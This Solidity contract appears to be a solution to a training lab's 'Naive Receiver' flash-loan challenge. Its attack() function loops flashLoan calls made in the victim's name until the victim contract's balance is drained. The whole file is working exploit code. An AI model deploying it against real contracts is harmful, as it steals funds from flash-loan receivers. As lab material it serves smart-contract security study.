pragma solidity ^0.8.4;

interface INaiveReceiverLenderPool {
    function flashLoan(address payable borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverExp {
    INaiveReceiverLenderPool pool;
    address payable victim;

    constructor(address _pool, address payable _victim) {
        pool = INaiveReceiverLenderPool(_pool);
        victim = _victim;
    }

    function attack() external {
        while (victim.balance > 0) {
            pool.flashLoan(victim, 500);
        }
    }
}